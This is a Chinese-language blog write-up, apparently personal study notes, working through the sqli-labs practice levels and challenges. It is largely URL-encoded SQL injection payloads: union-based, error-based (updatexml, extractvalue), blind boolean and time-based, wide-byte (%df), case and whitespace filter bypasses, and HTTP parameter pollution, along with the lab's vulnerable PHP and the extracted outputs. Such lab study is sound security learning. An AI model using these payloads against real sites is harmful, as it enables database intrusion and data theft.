因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等<br><br>  ?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:3</p>\n</li>\n<li><p><strong> less 24 POST - Second Order Injection *Real treat* - Stored Injections </strong> <br><br>  本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入<br><br>  php中:<br></p>\n<pre><code>$sql = &quot;select count(\\*) from users where username=&apos;$username&apos;&quot;;\n    $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);\n    $sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;;\n    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;\n</code></pre><p>  先注册一个admin’#用户，更改其密码，实际上是更改的admin的密码</p>\n</li>\n<li><p><strong>less 25 GET - Error Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong><br><br>  $id= preg_replace(‘/or/i’,””, $id);            //strip out OR (non case sensitive)<br><br>  $id= preg_replace(‘/AND/i’,””, $id);        //Strip out AND (non case sensitive)<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：使用union<br>  绕过过滤：</p>\n<pre><code>（1）大小写变形 Or,OR,oR\n（2）编码，hex，urlencode\n（3）添加注释/*or*/\n（4）利用符号 and=&amp;&amp; or=||\n</code></pre><p>  ?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23<br>  返回：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>\n</li>\n<li><p><strong>less 25a GET - Blind Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong> <br><br>  $id= blacklist($id);<br><br>  $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  //print_r(mysql_error()); <br><br>  报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤<br><br>  ?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)<br><br>然后依次这样，查出数据库名</p>\n</li>\n<li><p><strong>less 26 GETs - Error Based - All your Spaces and Comments Belong to us</strong> <br><br>  Comments 注释<br><br>  php中:<br></p>\n<pre><code>function blacklist($id)\n {\n $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)\n $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)\n $id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);        //strip out /*\n $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --\n $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #\n $id= preg_replace(&apos;/[\\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces\n $id= preg_replace(&apos;/[\\/\\\\\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes\n return $id;\n}\n</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：<br><br>注释过滤了可以手动闭合引号，空格过滤<br>  可以使用  %a0  换行，<br><br>/**/ 注释， （） 括号等绕过空格<br><br>  此处注释不能使用，为了使用select时去掉末尾引号，空格也不行<br><br>  id=’111’union(select(1),(version()),(3)） ‘ LIMIT 0,1; 使用括号时，引号还在<br><br>  ?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功</p>\n</li>\n<li><p><strong>less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis</strong> <br><br>  过滤和less26相同<br><br>  $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;<br><br>  ?id=111%27)union%a0select%a01%2cversion()%2c3||(%271<br></p>\n<p>  思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&amp;<br><br>  ?id=1%27%26%26%271=1 猜测为’ ‘<br><br>  ?id=1%27)%26%26(%271=1 猜测为（’ ‘）<br><br>  ?id=1%22%26%26%221=1 猜测为 “ “<br><br>  ?id=1%22)%26%26(%221=1 猜测为(“ “)<br><br>  ?id=1)%26%26(1=1  猜测为()<br><br>  ?id=1%26%261=1 无<br><br>等诸如此类<br></p>\n</li>\n<li><p><strong>less 27 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes</strong><br></p>\n<pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);        //strip out /*\n$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.\n$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union\n$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select\n$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION\n$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT\n$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union\n$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out select\nreturn $id;\n}\n</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br></p>\n<p>  思路一：大小写绕过<br><br>  ?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27<br><br>  思路二：报错或延时？</p>\n</li>\n<li><p><strong>less 27a GET - Blind Based - All your UNION &amp; SELECT Belong to us -Double Quotes</strong><br><br>  1.?id=1%22%26%26%221=1 成功，猜测为“ “过滤<br><br>  2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入<br></p>\n</li>\n<li><p><strong>less 28 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes with Parentesis</strong><br></p>\n<pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);                //strip out /*\n$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);                //Strip out --.\n$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);                    //Strip out #.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.\n$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);                    Strip out spaces.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.\n$id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.\nreturn $id;\n}\n $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;\n</code></pre><p>  ?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27</p>\n<ul>\n<li><strong>less 28a GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes - Parentesis</strong><br><pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;, $id);        //Strip out spaces.\nreturn $id;\n}\n$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;\n</code></pre>?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同</li>\n</ul>\n</li>\n<li><p><strong>less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application</strong><br><br>服务器（两层架构）<br><br>  当?id=1&amp;id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容<br><br>  此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 <br><br>  ?id=1&amp;id=-2%27union%20select%201,user(),version()%27<br><br>  返回:<br><br>Your Login name:root@localhost<br><br>  Your Password:5.7.23-0ubuntu0.16.04.1</p>\n</li>\n<li><p><strong>less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong><br><br>  ?id=1&amp;id=-2%22union%20select%201,user(),version()%22</p>\n</li>\n<li><p><strong>less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong> <br><br>  ?id=1&amp;id=-2”)union%20select%201,user(),version()%23</p>\n</li>\n<li><p><strong>less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars</strong><br><br>宽字节注入<br><br>  原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \\ 除掉。<br><br>一般有两种思路： <br><br>  1、%df 吃掉 \\ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。<br><br>  2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。<br></p>\n<p>  addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：’   “  \\<br><br>  addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行</p>\n<pre><code>function check_addslashes($string)\n{\n    $string= addslashes($string);    \n    return $string;\n}\n</code></pre><p>  例?id=-1%27%20union%20select%201,version(),user()%20%27<br><br>  The filtered request is :-1\\’ union select 1,version(),user() \\’<br></p>\n<p>  ?id=-1%df%27%20union%20select%201,version(),user()%23<br><br>  返回:<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:root@localhost</p>\n</li>\n<li><p><strong>less 33 GET -  Bypass AddSlashers()</strong><br><br>  ?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样</p>\n</li>\n<li><p><strong>less 34 POST - Bypass AddSlashers()</strong><br><br>  post型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为’ 。我们就 可以利用这个方式进行尝试。<br></p>\n<p>  運’ or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c <br><br>  SELECT username, password FROM users WHERE username=’運\\’ or 1=1# ‘ and password=’’ LIMIT 0,1</p>\n</li>\n<li><p><strong>less 35 GET - Bypass Add Slashes(we dont need them) Integer Based</strong><br><br>  php中：$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  可以看出，不需要构造特殊符号<br><br>  ?id=-1%20union%20select%201,version(),user()%23<br></p>\n</li>\n<li><p><strong>less 36 GET - Bypass mysql_real _escape _string</strong><br><br>  mysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符<br><br>  string 必需，要转义的字符串<br><br>  connection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接<br></p>\n<pre><code>\\x00  ascii码 null\n\\n    换行\n\\r    回车\n\\\n&apos;\n&quot;\n\\x1a （即十进制26）&amp;\n</code></pre><p>  这些字符会被转义<br></p>\n<pre><code>function check_quotes($string)\n{\n    $string= mysql_real_escape_string($string);    \n    return $string;\n}\n$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;\n</code></pre><p>  ?id=-1%df%27%20union%20select%201,version(),user()%23 成功</p>\n</li>\n<li><p><strong>less 37 POST - Bypass mysql_real_escape_string</strong> <br><br>  運’ or 1=1 #</p>\n</li>\n</ul>\n<hr>\n<p>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 <br><br>原理:<br><br>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 <br><br>局限:<br><br>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 <br><br>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。<br>因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息<br></p>\n<p>暂不深入了解</p>\n<hr>\n<p>challenge</p>\n<ul>\n<li><p><strong>GET - challenge - Union -10 Queries Allowed - Variation1</strong><br><br>  1.查表名<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  得到此次的表名: 8TELU525VO<br><br>  2.查列名 用concat一次性查完输出<br><br>  ?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23<br><br>  返回:<br><br>Your Login name:id—,sessid—,secret_63JY—,tryy—<br><br>  Your Password:3<br><br>  3.得到密码id,sessid,secret_63JY<br><br>  ?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23<br><br>  返回:<br><br>Your Login name:856213ca887976a33e3d91b2c61fa65a<br><br>  Your Password:M5ztHsC34iN2X0lzCiXJ27Cp<br><br>  4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成</p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 2</strong><br><br>  1.猜测过滤规则<br><br>  当输入?id=1)%26%26(1=1 时 成功 可知过滤为()<br><br>  2.参考less 54<br><br>  ?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  表名为: C73JPUKYS9    <br><br>  ?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d<br>  %22C73JPUKYS9%22),3%20%23<br><br>  列名: Your Login name:id—,sessid—,secret_DH0J—,tryy—<br><br>  ?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23<br><br>  密码：<br><br>Your Login name: 4d0218b33a232f675d53381ef38b5370<br><br>Your Password: kjbKG19I62vmYE3kS7gGN7qf <br> 成功</p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 3</strong><br><br>  1.猜测<br><br>  ?id=1%27)%26%26(%271=1 成功 可知为(‘ ‘)<br><br>  2.下面步骤如上<br></p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 4</strong><br><br>  如上</p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 1</strong><br><br>  1.猜测<br><br>  ?id=1%27%26%26%271=1 成功，可知为’ ‘<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 <br>  返回同上，可知有其它过滤规则<br><br>  尝试报错注入<br><br>  ?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()<br><br>  2.获取表名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23<br><br>  返回：XPATH syntax error: ‘~4HT916R6T1~’<br><br>  3.获取列名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,”—“)%20from%20information_schema.columns%20where%20table_name%3d%20”4HT916R6T1”),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~id—,sessid—,secret_EN0R—,’为什么有一个列没显示<br><br>  4.获取密码<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~OcDGOovBkd3XMq3FpuSNtEIN~’<br></p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 2</strong><br><br>  ?id=1%26%261=1 返回成功，说明无字符<br><br>  剩余步骤如 less 58<br></p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 3</strong><br> ?id=1%22%26%26%221=1 猜测为 “ “<br><br>?id=1%22)%26%26(%221=1 猜测为(“ “) <br><br>都返回相同结果？？？？<br><br>但实际上</p>\n<pre><code>$id = &apos;(&quot;&apos;.$id.&apos;&quot;)&apos;;\n  $sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;\n     if($row)\n      {\n          echo &apos;&lt;font color= &quot;#00FFFF&quot;&gt;&apos;;\n          $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);\n          $pass = array_reverse($unames);\n          echo &apos;Your Login name : &apos;. $unames[$row[&apos;id&apos;]];\n          echo &quot;&lt;br&gt;&quot;;\n          echo &apos;Your Password : &apos; .$pass[$row[&apos;id&apos;]];\n          echo &quot;&lt;/font&gt;&quot;;\n      }\n      else\n      {\n          echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;\n          print_r(mysql_error());\n          echo &quot;&lt;/font&gt;&quot;;  \n      }\n</code></pre><p> 每次返回都是$unames=array（），奸诈！！</p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 4</strong><br><br>  $sql=”SELECT * FROM security.users WHERE id=((‘$id’)) LIMIT 0,1”;</p>\n</li>\n<li><p><strong>GET - Challenge - Blind -130 Queries Allowed - Variation 1</strong><br><br>  盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率<br><br>  ?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))–+</p>\n</li>\n</ul>\n<h3 id=\"三-杂记\"><a href=\"#三-杂记\" class=\"headerlink\" title=\"三.杂记\"></a>三.杂记</h3><ul>\n<li><p>盲注<br><br>  语句执行完后没有回显<br><br>  1.基于布尔<br><br>  构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）<br><br>  2.基于报错<br><br>  SELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2));<br><br>  [Err] 1062 - Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘&lt;group_key&gt;’<br><br>  具体原理不懂，concat, floor, group by，rand(0)是关键<br><br>  如果rand被禁用可以使用用户变量来报错？？<br><br>  或者XPath报错等<br><br>  3.基于时间-延迟注入<br><br>  利用if,当条件正确或错误时，确定要不要sleep()来猜测<br></p>\n</li>\n<li><p>insert/update/delete注入<br><br>  思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br></p>\n</li>\n<li><p>order by<br><br>可以用来确定有几列，如 order by 4 ,报错没有第四列<br></p>\n</li>\n<li><p>url编码</p>\n<pre><code>空格    -    %20\n&quot;          -    %22\n#         -    %23\n%        -    %25\n&amp;         -    %26\n(          -    %28\n)          -    %29\n+         -    %2B\n,          -    %2C 逗号\n/          -    %2F\n:          -    %3A\n;          -    %3B\n&lt;         -    %3C\n=         -    %3D\n&gt;         -    %3E\n?         -    %3F\n@       -    %40\n\\          -    %5C\n|          -    %7C\n&apos;               %27  单引号\n</code></pre></li>\n<li><p>补充一些数据库知识<br></p>\n<pre><code>infomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。\n如数据库名，数据库的表，表栏的数据类型与访问权限等。&lt;/br&gt;\n再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，\n每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。&lt;/br&gt;\n\ninformation_schema的表schemata中的列schema_name记录了所有数据库的名字\ninformation_schema的表tables中的列table_schema记录了所有数据库的名字\ninformation_schema的表tables中的列table_name记录了所有数据库的表的名字\ninformation_schema的表columns中的列table_schema记录了所有数据库的名字\ninformation_schema的表columns中的列table_name记录了所有数据库的表的名字\ninformation_schema的表columns中的列column_name记录了所有数据库的表的列的名字\n</code></pre><p>查询指定数据库所有表名<br><br>SELECT table_name FROM information_schema.tables WHERE table_schema=’数据库名’;<br><br>查询mysql中所有数据库名字<br><br>SELECT schema_name FROM information_schema.schemata<br></p>\n<p>  version()  mysql版本<br>  user()用户<br>  @@datadir数据路径<br>  @@version_compile_os 操作系统<br>  database() 数据库名字<br>  SELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();<br>–+/# 注释，一般用#，url编码为%23<br><br><br>mysql中XPath:<br><br>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()<br><br>ExtractValue():<br><br>  EXTRACTVALUE (XML_document, XPath_string); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  作用：从目标XML中返回包含所查询值的字符串<br><br>UpdateXml():<br><br>  UPDATEXML (XML_document, XPath_string, new_value); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  第三个参数：new_value，String格式，替换查找到的符合条件的数据 <br><br>  作用：改变文档中符合条件的节点的值 <br><br>通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br><br>0x7E为~的ascii码<br><br><br>if<br><br>IF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3<br><br><br>concat() 连接字符串，将多个连接在一起。<br><br>  concat(str1,str2,…)<br><br>concat_ws() 将多个字符串连接在一起，可以一次性指定分隔符<br><br>  concat_ws(sparator, str1,str2,…)<br><br>group_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果<br><br>  group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )<br></p>\n</li>\n</ul>\n<ul>\n<li><p>问题：<br><br>1.怎么确定是哪种注入类型？<br><br>2.在没有返回值的情况下判断单引号双引号括号等</p>\n</li>\n<li><p>其它</p>\n<pre><code>?id=1%27%26%26%271=1 猜测为’ ‘\n?id=1%27)%26%26(%271=1 猜测为（’ ‘）\n?id=1%22%26%26%221=1 猜测为 &quot; &quot;\n?id=1%22)%26%26(%221=1 猜测为(&quot; &quot;)\n?id=1)%26%26(1=1  猜测为()\n?id=1%26%261=1 无\n</code></pre></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>sql注入:利用现有程序，使之执行构造的payload.</p>\n<h3 id=\"一-环境搭建\"><a href=\"#一-环境搭建\" class=\"headerlink\" title=\"一. 环境搭建\"></a>一. 环境搭建</h3><ul>\n<li>ubuntu16.04虚拟机</li>\n<li>更新阿里源 apt-get update</li>\n<li>安装mysql apt-get install mysql-server mysql-client -y</li>\n<li>安装apache apt-get install apache2 -y</li>\n<li>安装git apt-get install git -y</li>\n<li>项目 cd /var/www &amp;&amp; sudo git clone <a href=\"https://github.com/Audi-1/sqli-labs.git\" target=\"_blank\" rel=\"noopener\">https://github.com/Audi-1/sqli-labs.git</a> sqli-labs  </li>\n<li>更改项目的mysql配置文件为自己数据库</li>\n<li>现在在浏览器localhost/sqli-labs已经可以访问到了</li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>navicat连不上mysql <br><br>  注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1<br><br>  修改select user, host from user;  update user set host = “%” where host = ‘localhost’;  flush privileges;</li>\n<li><p>php版本导致mysql_connect()废弃 <br><br>  安装phpstorm 配置phpcgi  apt-get install php版本-cgi<br><br>  降低版本到php5.6错误仍然在<br><br>  第二天重启Phpstrom 打开网页，错误消失<br><br>猜测是降低版本有效，但第一天有缓存<br></p>","more":"<h3 id=\"二-sqli-labs\"><a href=\"#二-sqli-labs\" class=\"headerlink\" title=\"二.sqli-labs\"></a>二.sqli-labs</h3><p>参考了大牛的教程<a href=\"https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf\" target=\"_blank\" rel=\"noopener\">https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf</a></p>\n</li>\n<li><p><strong> less1 GET-Error based - Single quotes - String <br> </strong><br>  php中代码 SELECT * FROM users WHERE id=’$id’ LIMIT 0,1;<br>  %20 空格 %27 单引号 %3D 等于号<br><br>  一：?id=(select%20id%20from%20users%20where%20username%20%3D”admin”) 未成功      ’$id’ 注入被单引号包裹，将输入变成了字符串<br><br>  二：?id=’%20and%20username%3D%27admin 未成功 id=’’这个条件未绕过<br>  想利用id=这个条件或者绕过这个条件<br><br>  三：?id=’%20or%20username%3D%27admin 成功<br><br>  基于二，转换思路，利用or成功绕过<br><br>  爆破数据库版本<br><br>  ?id=-1%27%20%20union%20select%201%2cversion()%2c3%23<br><br>  ？id=-1’  union select 1,version(),3#<br><br>  union必须列一样，所以1和3是为了保持三列</p>\n</li>\n<li><p><strong> less 2 GET - Error based -Intiger based<br> </strong><br>  php中代码 $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  $id未加引号过滤输入<br> ?id=(select%20id%20from%20users%20where%20username%20%3D”admin”)成功注入</p>\n</li>\n<li><p><strong> less 3 GET - Error based - single quotes with twist - string</strong><br><br>  php中代码 $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”; 用括号和单引号进行了过滤<br><br>  思路：消除括号<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27  成功</p>\n</li>\n</ul>\n<ul>\n<li><p><strong> less 4  GET - Error based - Double Quotes - String </strong> <br><br>  php中代码<br><br>  $id = ‘“‘ . $id . ‘“‘;<br><br>  $sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27 成功<br></p>\n<p>  关于前四个less的一些心得：</p>\n<pre><code>1.找错误：\n    尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题\n    例：?id=&quot;\n             返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&quot;&quot;) LIMIT 0,1&apos; at line 1\n        可以看出输入所在位置为（“输入”）\n2.注入利用\n    通过union来执行自己想要的sql\n</code></pre></li>\n<li><p><strong> less 5  GET - Double Injection - Single Quotes - String </strong> <br><br>双查询注入（双查询：select嵌套select）<br><br>  输入?id=‘ 失败， use near 1  由此猜测为单引号<br><br>  ?id=’%20or%20username%3D%27admin 成功 <br><br>  但是sql执行结果前端并没有进行输出，怎么利用？<br></p>\n<p>  查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。<br><br>  发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）<br><br>  count() 计数<br><br>  rand() 随机<br><br>  group by 分组<br><br>  floor() 向下取整，舍弃小数部分<br></p>\n<p>  ?id=-1%27%20union%20select%201%2c(select%20count(*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功<br><br>  Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br>  其中version(）是我们希望执行的函数，可以换成其它</p>\n</li>\n<li><p><strong> less 6 GET - Double Injection - Double Quotes - String </strong> <br></p>\n<p>  ?id=-1%22%20union%20select%201%2c(select%20count(*)%20from%        20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功</p>\n</li>\n<li><p><strong> less 